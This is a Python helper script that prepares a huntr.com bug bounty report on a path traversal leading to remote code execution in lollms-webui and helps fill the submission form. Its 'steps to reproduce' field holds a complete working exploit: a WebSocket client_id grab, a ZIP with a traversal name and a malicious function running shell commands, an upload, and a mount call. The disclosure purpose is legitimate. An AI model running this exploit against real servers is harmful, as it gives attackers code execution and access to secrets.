#!/usr/bin/env python3
"""
Huntr.com Form Filler - Browser Automation Script
Uses AppleScript to control Chrome on macOS

Usage: python3 fill_huntr_form.py
"""

import subprocess
import time
import json
import os

# Form data
FORM_DATA = {
    "cvss": {
        "attack_vector": "Network",
        "attack_complexity": "Low",
        "privileges_required": "Low",
        "user_interaction": "None",
        "scope": "Unchanged",
        "confidentiality": "High",
        "integrity": "High",
        "availability": "High"
    },
    "writeup": {
        "title": "Path Traversal in /upload_app leads to RCE via custom function injection",
        "description": """A critical Path Traversal vulnerability has been discovered in the lollms-webui application that allows authenticated attackers to achieve Remote Code Execution (RCE) by uploading malicious ZIP files to the /upload_app endpoint.

The vulnerability exists in lollms/server/endpoints/lollms_apps.py at line 340, where the `name` field from description.yaml is used directly in path operations without proper sanitization. This allows attackers to use path traversal sequences (../) in the application name to write files to arbitrary locations on the server.

Technical Details:
- The /upload_app endpoint accepts ZIP file uploads for custom applications
- The description.yaml file inside the ZIP contains a `name` field
- This name field is used to construct the destination path without sanitization
- By setting name to "../custom_function_calls/evil_func", attackers can escape the apps directory
- Once files are written to custom_function_calls/, the attacker can mount and execute arbitrary Python code
- This leads to full Remote Code Execution on the server

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (Score: 8.8 High)""",
        "steps": """## Prerequisites
- lollms-webui running on port 9600 (default)
- Python 3 with: pip install requests websocket-client

## Step 1: Obtain client_id via WebSocket
The lollms-webui requires a valid client_id for API authentication:

```python
import websocket
import json
import time

client_id = None

def on_message(ws, message):
    global client_id
    data = json.loads(message)
    if "client_id" in str(data):
        cid = data.get("client_id") or data.get("data", {}).get("client_id")
        if cid:
            client_id = cid
            ws.close()

ws = websocket.WebSocketApp("ws://localhost:9600/ws", on_message=on_message)
import threading
t = threading.Thread(target=ws.run_forever)
t.daemon = True
t.start()
time.sleep(3)
```

## Step 2: Create malicious ZIP with path traversal payload

```python
import zipfile
import io

TRAVERSAL_NAME = "../custom_function_calls/evil_func"

DESCRIPTION_YAML = f'''
name: {TRAVERSAL_NAME}
description: "Malicious app"
version: "1.0"
'''

MALICIOUS_FUNCTION = '''
import os
def execute(**kwargs):
    result = os.popen("id && hostname").read()
    with open("/tmp/pwned_lollms", "w") as f:
        f.write(result)
    return {"status": "executed", "output": result}
'''

buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("description.yaml", DESCRIPTION_YAML)
    zf.writestr("function.py", MALICIOUS_FUNCTION)
```

## Step 3: Upload the malicious ZIP

```python
import requests

r = requests.post(
    "http://localhost:9600/upload_app",
    params={"client_id": client_id},
    files={"file": ("exploit.zip", buf, "application/zip")},
    timeout=15
)
print(f"Upload response: {r.status_code}")
```

## Step 4: Mount the malicious function

```python
r = requests.post(
    "http://localhost:9600/mount_function_call",
    json={
        "client_id": client_id,
        "function_category": "custom",
        "function_name": "evil_func"
    },
    timeout=10
)
```

## Step 5: Verify RCE
Check if /tmp/pwned_lollms was created on the server with command output.""",
        "impact": """This vulnerability allows authenticated attackers to achieve full Remote Code Execution on the server:

**Confidentiality Impact (HIGH)**: Attackers can read any file accessible by the lollms process including:
- Configuration files with API keys and credentials
- User data and conversation history
- Custom models and training data
- Environment variables and secrets

**Integrity Impact (HIGH)**: Attackers can write/overwrite arbitrary files:
- Plant backdoors in application code
- Modify configurations
- Inject malicious custom functions
- Deface the application

**Availability Impact (HIGH)**: Attackers can cause denial of service:
- Delete critical application files
- Corrupt the database
- Kill the lollms process

**Business Impact**:
- Complete server compromise
- Data breach of all user information
- Supply chain attack vector affecting all users
- Potential lateral movement into internal network

CVSS Score: 8.8 (High)""",
        "permalink": "https://github.com/ParisNeo/lollms-webui/blob/main/lollms/server/endpoints/lollms_apps.py#L340"
    }
}


def run_applescript(script):
    """Execute AppleScript command"""
    try:
        result = subprocess.run(
            ["osascript", "-e", script],
            capture_output=True,
            text=True,
            timeout=10
        )
        return result.returncode == 0, result.stdout, result.stderr
    except Exception as e:
        return False, "", str(e)


def fill_dropdown(field_name, value):
    """Fill a dropdown/select field"""
    # JavaScript to click dropdown and select option
    js = f"""
    try {{
        // Find dropdown by label or placeholder
        const dropdowns = document.querySelectorAll('select, [role="listbox"], [data-testid*="cvss"]');
        let found = null;
        
        for (let dd of dropdowns) {{
            if (dd.textContent.toLowerCase().includes('{field_name.lower()}') || 
                dd.getAttribute('aria-label')?.toLowerCase().includes('{field_name.lower()}')) {{
                found = dd;
                break;
            }}
        }}
        
        if (found) {{
            found.focus();
            found.click();
            return true;
        }}
        return false;
    }} catch (e) {{
        return false;
    }}
    """
    return js


def fill_textarea(field_name, text):
    """Fill a textarea field"""
    # Escape text for JavaScript
    escaped_text = text.replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n')
    
    js = f"""
    try {{
        const textareas = document.querySelectorAll('textarea');
        for (let ta of textareas) {{
            if (ta.getAttribute('name')?.toLowerCase().includes('{field_name.lower()}') ||
                ta.getAttribute('placeholder')?.toLowerCase().includes('{field_name.lower()}') ||
                ta.getAttribute('aria-label')?.toLowerCase().includes('{field_name.lower()}')) {{
                ta.value = `{escaped_text}`;
                ta.dispatchEvent(new Event('input', {{ bubbles: true }}));
                ta.dispatchEvent(new Event('change', {{ bubbles: true }}));
                return true;
            }}
        }}
        
        // Try finding by label
        const labels = document.querySelectorAll('label');
        for (let label of labels) {{
            if (label.textContent.toLowerCase().includes('{field_name.lower()}')) {{
                const ta = label.querySelector('textarea');
                if (ta) {{
                    ta.value = `{escaped_text}`;
                    ta.dispatchEvent(new Event('input', {{ bubbles: true }}));
                    ta.dispatchEvent(new Event('change', {{ bubbles: true }}));
                    return true;
                }}
            }}
        }}
        return false;
    }} catch (e) {{
        console.error(e);
        return false;
    }}
    """
    return js


def fill_input(field_name, text):
    """Fill a text input field"""
    escaped_text = text.replace('\\', '\\\\').replace('"', '\\"')
    
    js = f"""
    try {{
        const inputs = document.querySelectorAll('input[type="text"], input:not([type])');
        for (let inp of inputs) {{
            if (inp.getAttribute('name')?.toLowerCase().includes('{field_name.lower()}') ||
                inp.getAttribute('placeholder')?.toLowerCase().includes('{field_name.lower()}') ||
                inp.getAttribute('aria-label')?.toLowerCase().includes('{field_name.lower()}')) {{
                inp.value = `{escaped_text}`;
                inp.dispatchEvent(new Event('input', {{ bubbles: true }}));
                inp.dispatchEvent(new Event('change', {{ bubbles: true }}));
                return true;
            }}
        }}
        return false;
    }} catch (e) {{
        return false;
    }}
    """
    return js


def main():
    print("=" * 60)
    print("Huntr.com Form Filler")
    print("=" * 60)
    
    # Check if Chrome is running
    success, stdout, stderr = run_applescript('tell application "Google Chrome" to get name of window 1')
    if not success:
        print("❌ Google Chrome is not running. Please open Chrome and navigate to huntr.com first.")
        print("\nManual instructions:")
        print("1. Open Google Chrome")
        print("2. Go to https://huntr.com")
        print("3. Navigate to the vulnerability submission form")
        print("4. Run this script again")
        return
    
    print("✓ Google Chrome detected")
    
    # Get active tab URL
    success, stdout, stderr = run_applescript('tell application "Google Chrome" to get URL of active tab of window 1')
    if success and "huntr" in stdout.lower():
        print(f"✓ Huntr tab detected: {stdout.strip()}")
    else:
        print("⚠ Please navigate to the huntr.com vulnerability submission form")
        print("  and make it the active tab, then run this script again.")
        return
    
    print("\n" + "=" * 60)
    print("FORM DATA READY FOR SUBMISSION")
    print("=" * 60)
    
    print("\n📋 CVSS FIELDS (8 dropdowns):")
    print("-" * 40)
    for field, value in FORM_DATA["cvss"].items():
        print(f"  • {field.replace('_', ' ').title()}: {value}")
    
    print("\n📝 WRITE-UP FIELDS:")
    print("-" * 40)
    print(f"  • Title: {FORM_DATA['writeup']['title'][:60]}...")
    print(f"  • Description: {len(FORM_DATA['writeup']['description'])} chars")
    print(f"  • Steps to Reproduce: {len(FORM_DATA['writeup']['steps'])} chars")
    print(f"  • Impact: {len(FORM_DATA['writeup']['impact'])} chars")
    print(f"  • Permalink: {FORM_DATA['writeup']['permalink']}")
    
    print("\n" + "=" * 60)
    print("MANUAL COPY-PASTE INSTRUCTIONS")
    print("=" * 60)
    print("""
Since browser automation can be unreliable with modern web apps,
here's the recommended approach:

1. CVSS Fields (8 dropdowns):
   - Click each dropdown and select the value shown above
   
2. Write-up Fields:
   - Copy each section from the output below
   - Paste into the corresponding form field
   
3. Attach PoC:
   - Upload the file: /Users/code/project/intel/results/poc.py
   
4. Review and Submit
""")
    
    print("\n" + "=" * 60)
    print("COPY-PASTE READY CONTENT")
    print("=" * 60)
    
    print("\n### TITLE (copy this):")
    print("-" * 40)
    print(FORM_DATA["writeup"]["title"])
    
    print("\n### DESCRIPTION (copy this):")
    print("-" * 40)
    print(FORM_DATA["writeup"]["description"])
    
    print("\n### STEPS TO REPRODUCE (copy this):")
    print("-" * 40)
    print(FORM_DATA["writeup"]["steps"])
    
    print("\n### IMPACT (copy this):")
    print("-" * 40)
    print(FORM_DATA["writeup"]["impact"])
    
    print("\n### PERMALINK (copy this):")
    print("-" * 40)
    print(FORM_DATA["writeup"]["permalink"])
    
    print("\n" + "=" * 60)
    print("NEXT STEPS")
    print("=" * 60)
    print("""
1. Copy each section above and paste into the huntr.com form
2. Upload poc.py file from: /Users/code/project/intel/results/poc.py
3. Click "Submit Report"
4. Save the submission URL

After submission, run:
  echo '{"status":"submitted","url":"https://huntr.com/bounties/...","timestamp":'$(date +%s)'}' > /Users/code/project/intel/results/submission_status.json
""")


if __name__ == "__main__":
    main()
